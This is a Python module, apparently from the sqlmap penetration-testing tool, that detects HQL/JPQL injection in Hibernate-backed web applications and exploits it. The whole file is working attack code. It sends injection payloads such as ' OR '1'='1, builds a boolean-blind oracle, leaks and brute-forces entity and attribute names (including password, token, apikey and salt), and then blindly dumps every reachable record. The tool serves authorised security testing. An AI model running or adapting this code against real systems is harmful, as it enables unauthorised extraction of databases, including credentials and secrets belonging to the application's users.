#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import HQL_CHAR_MAX
from lib.core.settings import HQL_CHAR_MIN
from lib.core.settings import HQL_COMMON_ENTITIES
from lib.core.settings import HQL_ENTITY_REGEX
from lib.core.settings import HQL_ERROR_REGEX
from lib.core.settings import HQL_ERROR_SIGNATURES
from lib.core.settings import HQL_MAX_FIELDS
from lib.core.settings import HQL_MAX_LENGTH
from lib.core.settings import HQL_MAX_RECORDS
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange


SENTINEL = randomStr(length=10, lowercase=True)

HQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

# Attribute names probed (via an error-vs-valid oracle) once the mapped entity is
# known. HQL has no information_schema, so a mapped attribute either resolves
# (valid query) or raises a PathElementException (error page); that difference is
# the enumeration oracle. Ordered by real-world frequency.
HQL_COMMON_FIELDS = (
    "id", "name", "username", "user", "login", "email", "mail", "password",
    "passwd", "pass", "pwd", "secret", "token", "apikey", "role", "roles",
    "firstname", "lastname", "fullname", "phone", "address", "city", "country",
    "active", "enabled", "created", "updated", "description", "title", "status",
    "type", "code", "key", "hash", "salt", "uuid", "owner", "amount", "price",
)

# Detection boundaries, priority-ordered. Each is (true, false, extraction prefix,
# extraction suffix, sentinel-based). The application's own trailing delimiter
# (the closing quote it appends after the injected value) balances the suffix, so
# no comment is needed (HQL frequently rejects SQL line comments anyway).
_BOUNDARY_TABLE = (
    # (true_breakout,     false_breakout,     ext_prefix, ext_suffix,    sentinel )
    ("' OR '1'='1",       "' AND '1'='2",     "' OR ",    " OR '1'='2",  True),
    ('" OR "1"="1',       '" AND "1"="2',     '" OR ',    ' OR "1"="2',  True),
    (" OR 1=1",           " AND 1=2",         " OR ",     "",            False),
)

# Boundary carries the extraction prefix/suffix and whether the base value must be
# a non-matching sentinel (OR-style) so a true predicate flips an empty result set.
Boundary = namedtuple("Boundary", ("prefix", "suffix", "sentinel"))

Slot = namedtuple("Slot", ("place", "parameter", "backend", "entity", "oracle", "boundary", "payload"))
Slot.__new__.__defaults__ = (None,) * 7


def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()


def _delim(place):
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'


def _confParameters(place):
    try:
        return conf.parameters.get(place, "")
    except AttributeError:
        return conf.parameters[place] if place in conf.parameters else ""


def _originalValue(place, parameter):
    for segment in _confParameters(place).split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""


def _replaceSegment(place, parameter, value):
    delimiter = _delim(place)
    raw = _confParameters(place)
    retVal, replaced = [], False

    for part in raw.split(delimiter):
        name, _, _ = part.partition('=')
        if not replaced and name.strip() == parameter:
            retVal.append("%s=%s" % (name, value))
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = []
        for name, oldValue in conf.paramDict.get(place, {}).items():
            retVal.append("%s=%s" % (name, value if name == parameter else oldValue))

    return delimiter.join(retVal)


def _send(place, parameter, value):
    """Issue a single HTTP request with the target parameter set to `value`,
    temporarily mutating conf.parameters so sqlmap's normal request machinery
    (URL construction, cookies, headers, encodings) is fully preserved."""

    if conf.delay:
        time.sleep(conf.delay)

    old_params = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, value)

    try:
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, _ = Request.getPage(raise404=False, silent=True)
        return page or ""
    except Exception as ex:
        logger.debug("HQL probe request failed: %s" % getUnicode(ex))
        return ""
    finally:
        conf.parameters[place] = old_params


def _isError(page):
    return bool(re.search(HQL_ERROR_REGEX, getUnicode(page or "")))


def _backendFromError(page):
    page = getUnicode(page or "")
    for backend, regex in HQL_ERROR_SIGNATURES:
        if re.search(regex, page):
            return backend
    return None


def _entityFromError(page):
    page = getUnicode(page or "")
    for regex in HQL_ENTITY_REGEX:
        match = re.search(regex, page)
        if match:
            return match.group(1)
    return None


def _probeError(place, parameter):
    """Break the HQL string/numeric context and look for an ORM parser diagnostic.
    Returns (backend, page) - a hint only; the boolean oracle is authoritative."""

    original = _originalValue(place, parameter) or "1"
    normal = _send(place, parameter, original)

    for suffix in ("'", '"', "'||", " and", ")"):
        broken = _send(place, parameter, original + suffix)
        if not broken or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
            continue
        backend = _backendFromError(broken)
        if backend and not _isError(normal):
            return backend, broken

    return None, None


def _boolean(truthy, falsy):
    """Return the reproducible true page when true/false probes diverge (both must
    be independently reproducible), else None."""

    truePage = truthy()
    if truePage is None or _isError(truePage):
        return None
    if _ratio(truePage, truthy()) < UPPER_RATIO_BOUND:
        return None

    falsePage = falsy()
    if falsePage is None or _isError(falsePage):
        return None
    if _ratio(falsePage, falsy()) < UPPER_RATIO_BOUND:
        return None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage

    return None


def _detectBoolean(place, parameter):
    """Return (template, payload, boundary) for boolean-blind HQL injection."""

    original = _originalValue(place, parameter) or ""

    for true_bk, false_bk, prefix, suffix, sentinel in _BOUNDARY_TABLE:
        truePayload = original + true_bk
        falsePayload = original + false_bk
        template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                            lambda p=falsePayload: _send(place, parameter, p))
        if template:
            return template, truePayload, Boundary(prefix, suffix, sentinel)

    return None, None, None


def _base(boundary, original):
    # OR-style boundaries need a base value that matches no row so a true predicate
    # flips an empty result set into a populated one; AND-style keeps the original.
    if boundary.sentinel:
        return SENTINEL
    return "-1"


def _wrap(original, boundary, predicate):
    return "%s%s%s%s" % (original, boundary.prefix, predicate, boundary.suffix)


def _makeOracle(place, parameter, template, boundary, original):
    """Build oracle(predicate) -> bool from a verified true template."""

    cache = {}
    base = _base(boundary, original)

    def request(payload):
        if payload not in cache:
            cache[payload] = _send(place, parameter, payload)
        return cache[payload]

    def truth(predicate):
        page = request(_wrap(base, boundary, predicate))
        if page is None or _isError(page):
            return False
        return _ratio(template, page) >= UPPER_RATIO_BOUND

    truth.template = template
    truth.cache = cache
    return truth


def _leakEntity(place, parameter, boundary, original):
    """Force a path-resolution error to leak the mapped entity name. An unqualified
    identifier resolves against the query root, so a random one yields e.g.
    "Could not resolve attribute 'xyz' of 'com.app.User'"."""

    base = _base(boundary, original)
    marker = randomStr(length=8, lowercase=True)

    for reference in ("%s", "u.%s", "e.%s", "o.%s", "x.%s", "this.%s"):
        predicate = "%s IS NOT NULL" % (reference % marker)
        page = _send(place, parameter, _wrap(base, boundary, predicate))
        entity = _entityFromError(page)
        if entity:
            return entity

    return None


def _shortEntity(entity):
    # com.app.model.User -> User ; lab.App$Member -> Member
    return re.split(r"[.$]", entity)[-1] if entity else entity


def _bruteEntities(truth):
    """Recover mapped entity names through the boolean oracle alone (no reflected
    diagnostic needed): a mapped name keeps the FROM clause valid, an unmapped one
    raises UnknownEntityException and reads as false. Returns every match so the
    whole reachable model can be dumped, not just the injected query's entity."""

    retVal = []
    for entity in HQL_COMMON_ENTITIES:
        if truth("EXISTS(SELECT 1 FROM %s _h)" % entity):
            retVal.append(entity)
    return retVal


def _enumFields(truth, entity):
    """Probe common attribute names against the entity; a name that resolves keeps
    the query valid (oracle true), a missing one raises and reads as false."""

    fields = []
    for field in HQL_COMMON_FIELDS:
        if len(fields) >= HQL_MAX_FIELDS:
            break
        predicate = "EXISTS(SELECT _h.%s FROM %s _h)" % (field, entity)
        if truth(predicate):
            fields.append(field)
            logger.info("identified mapped attribute: '%s'" % field)
    return fields


# Frequency-ordered printable charset for blind character extraction
_META_ORDS = set(ord(_) for _ in ("'", '"', '\\'))
_FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) +
         tuple(xrange(ord('A'), ord('Z') + 1)) +
         tuple(xrange(ord('0'), ord('9') + 1)) +
         tuple(ord(_) for _ in "@._- +:/"))
_CHARSET = []
for _ in _FREQ:
    if HQL_CHAR_MIN <= _ <= HQL_CHAR_MAX and _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)
for _ in xrange(HQL_CHAR_MIN, HQL_CHAR_MAX + 1):
    if _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)

# Charset as an HQL string literal for LOCATE()-based binary search: each character's
# 1-based index inside this literal is recovered by bisection (~log2(n) requests vs a
# linear equality scan), and LOCATE is an index lookup so no lexicographic ordering /
# collation assumption is introduced. URL-structural bytes (%, &, +, #, ?) are excluded
# because they cannot survive a raw GET/POST value; such a byte is surfaced as '?' (as
# it was under the previous linear scan). ', ", \ are already excluded above.
_URL_HOSTILE = set(ord(_) for _ in "%&+#?")
_CS_LITERAL = "".join(chr(_) for _ in _CHARSET if _ not in _URL_HOSTILE)


def _scalar(entity, attrExpr, pin, after=None):
    """Scalar subquery over a single `entity` row selected by the smallest `pin`
    (optionally the smallest strictly greater than `after`, to walk rows in order).
    Alias-independent, so it works regardless of the outer query's alias. `attrExpr`
    is the already-built selected expression (references CAST(_h.<attr> AS string))."""

    bound = "" if after is None else " WHERE _h2.%s>%s" % (pin, after)
    inner = "SELECT %s FROM %s _h WHERE _h.%s=(SELECT MIN(_h2.%s) FROM %s _h2%s)" % (
        attrExpr, entity, pin, pin, entity, bound)
    return "(%s)" % inner


def _inferValue(truth, entity, attribute, pin, after=None, maxLen=HQL_MAX_LENGTH):
    """Blindly recover one attribute value of the row selected by `pin`/`after`."""

    # length first, by binary search
    lengthExpr = _scalar(entity, "LENGTH(CAST(_h.%s AS string))" % attribute, pin, after)
    if not truth("%s>=1" % lengthExpr):
        return ""

    lo, hi = 1, maxLen
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if truth("%s>=%d" % (lengthExpr, mid)):
            lo = mid
        else:
            hi = mid - 1
    length = lo

    chars = []
    for pos in xrange(1, length + 1):
        # index of this character inside _CS_LITERAL, recovered by binary search
        idxExpr = _scalar(entity, "LOCATE(SUBSTRING(CAST(_h.%s AS string),%d,1),'%s')" % (attribute, pos, _CS_LITERAL), pin, after)
        if not truth("%s>=1" % idxExpr):
            chars.append("?")
            continue

        lo, hi = 1, len(_CS_LITERAL)
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if truth("%s>=%d" % (idxExpr, mid)):
                lo = mid
            else:
                hi = mid - 1
        chars.append(_CS_LITERAL[lo - 1])

    return "".join(chars)


def _grid(columns, rows):
    columns = [getUnicode(_) for _ in columns]
    rows = [[getUnicode(_) for _ in row] for row in rows]

    widths = []
    for index, column in enumerate(columns):
        width = len(column)
        for row in rows:
            if index < len(row):
                width = max(width, len(getUnicode(row[index])))
        widths.append(width)

    separator = "+-" + "-+-".join("-" * _ for _ in widths) + "-+"

    def line(cells):
        return "| " + " | ".join((getUnicode(cells[index]) if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"

    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])


def _dumpEntity(oracle, place, parameter, entity):
    """Enumerate an entity's mapped attributes and blindly dump all of its rows."""

    logger.info("enumerating mapped attributes of entity '%s'" % entity)
    fields = _enumFields(oracle, entity)
    if not fields:
        logger.warning("entity '%s' confirmed but no common attribute resolved; the model may use non-standard names" % entity)
        return

    pin = "id" if "id" in fields else fields[0]
    columns = list(fields)

    # Walk records in ascending pin order: each row is pinned to the smallest pin
    # value strictly greater than the previous one. A numeric pin is required to
    # advance the cursor; otherwise only the first (smallest-pin) row is recovered.
    rows = []
    after = None
    for _ in xrange(HQL_MAX_RECORDS):
        pinValue = _inferValue(oracle, entity, pin, pin, after)
        if not pinValue:
            break

        record = {pin: pinValue}
        for field in fields:
            if field != pin:
                record[field] = _inferValue(oracle, entity, field, pin, after)
        rows.append([record.get(_, "") for _ in fields])
        logger.info("  retrieved record: %s" % ", ".join("%s='%s'" % (_, record.get(_, "")) for _ in fields))

        if not re.match(r"\A\d+\Z", pinValue):
            break
        after = pinValue
    else:
        logger.warning("entity '%s' hit the HQL_MAX_RECORDS (%d) cap; some records may be omitted" % (entity, HQL_MAX_RECORDS))

    conf.dumper.singleString("HQL: %s parameter '%s' entity '%s' (%d record%s, ordered by %s):\n%s" % (place, parameter, entity, len(rows), "s" if len(rows) != 1 else "", pin, _grid(columns, rows)))


def hqlScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--hql' is self-contained: it detects HQL/JPQL (Hibernate ORM) injection "
    debugMsg += "and blindly recovers the mapped entity model. SQL enumeration switches "
    debugMsg += "(--banner, --dbs, --tables, --users, --sql-query) do not apply"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = 0
    slots = []

    for place in (_ for _ in HQL_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing HQL injection on %s parameter '%s'" % (place, parameter))

            backendHint, _page = _probeError(place, parameter)
            if backendHint:
                logger.info("%s parameter '%s' reaches an ORM query parser (back-end: '%s')" % (place, parameter, backendHint))

            template, payload, boundary = _detectBoolean(place, parameter)
            if not template:
                if backendHint:
                    logger.info("%s parameter '%s' errors in the ORM parser but no boolean oracle was established" % (place, parameter))
                continue

            backend = backendHint or "Hibernate"
            original = _originalValue(place, parameter)
            # Error leakage only helps when the app actually reflects diagnostics
            entity = _leakEntity(place, parameter, boundary, original) if backendHint else None
            logger.info("%s parameter '%s' is vulnerable to HQL injection (back-end: '%s'%s)" % (place, parameter, backend, ", entity: '%s'" % entity if entity else ""))
            if conf.beep:
                beep()

            oracle = _makeOracle(place, parameter, template, boundary, original)
            slots.append(Slot(place=place, parameter=parameter, backend=backend,
                              entity=entity, oracle=oracle, boundary=boundary, payload=payload))

    if not slots:
        if tested:
            logger.warning("no parameter appears to be injectable via HQL injection (%d tested)" % tested)
        else:
            logger.warning("no parameters found to test for HQL injection")
        return

    for slot in slots:
        conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: HQL injection\n    Title: HQL boolean-based blind\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, slot.parameter, slot.payload))

    # Blind extraction covers as much of the mapped model as reachable: the error-leaked
    # entity (if any) plus every common entity the boolean oracle confirms is mapped.
    slot = next((_ for _ in slots if _.entity), slots[0])

    entities = []
    leaked = _shortEntity(slot.entity)
    if leaked:
        entities.append(leaked)

    logger.info("recovering mapped entities through the boolean oracle")
    for entity in _bruteEntities(slot.oracle):
        if entity not in entities:
            entities.append(entity)

    if not entities:
        logger.info("HQL injection confirmed; could not resolve a mapped entity for blind extraction")
        logger.info("HQL scan complete")
        return

    logger.info("dumping %d reachable entit%s: %s" % (len(entities), "y" if len(entities) == 1 else "ies", ", ".join("'%s'" % _ for _ in entities)))
    for entity in entities:
        _dumpEntity(slot.oracle, slot.place, slot.parameter, entity)

    logger.info("HQL scan complete")
